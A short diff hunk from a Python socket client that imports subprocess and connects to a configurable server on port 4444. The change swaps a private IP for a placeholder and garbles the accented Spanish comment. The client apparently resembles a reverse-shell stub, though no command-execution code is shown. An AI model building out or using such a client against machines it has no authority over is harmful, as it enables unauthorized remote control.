@@ -4,7 +4,7 @@ import subprocess
 import os
 
 def start_client():
-    host = '192.168.24.153'  # Cambia la dirección IP a la del servidor
+    host = 'x.x.x.x'  # Cambia la direcciÃ³n IP a la del servidor
     port = 4444
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
